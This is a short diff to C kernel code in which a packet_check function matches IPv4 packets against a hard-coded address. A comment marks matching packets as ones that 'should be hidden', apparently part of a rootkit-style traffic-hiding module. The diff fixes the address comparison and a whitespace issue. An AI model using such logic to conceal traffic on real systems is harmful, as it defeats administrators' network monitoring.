@@ -83,7 +83,7 @@
 int packet_check(struct sk_buff *skb)
 {
 	/* IP address we want to drop packets from, in NB order */
-         static unsigned char *drop_ip = "\x7f\x00\x00\x01";
+        static unsigned char *drop_ip = "\x7f\x00\x00\x01";
 	
 	/* check for ipv4 */
 	if (skb->protocol == htons(ETH_P_IP)) {
@@ -95,7 +95,7 @@ int packet_check(struct sk_buff *skb)
 		if(find_packet_ipv4((u8 *)&header->saddr) 
 			|| find_packet_ipv4((u8 *)&header->daddr)) {
 		*/
-		if(header->saddr == drop_ip || header->daddr == drop_ip){
+		if(header->saddr == *(unsigned int *)drop_ip || header->daddr == *(unsigned int *)drop_ip){
 			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 
 			/* ip in list, should be hidden */
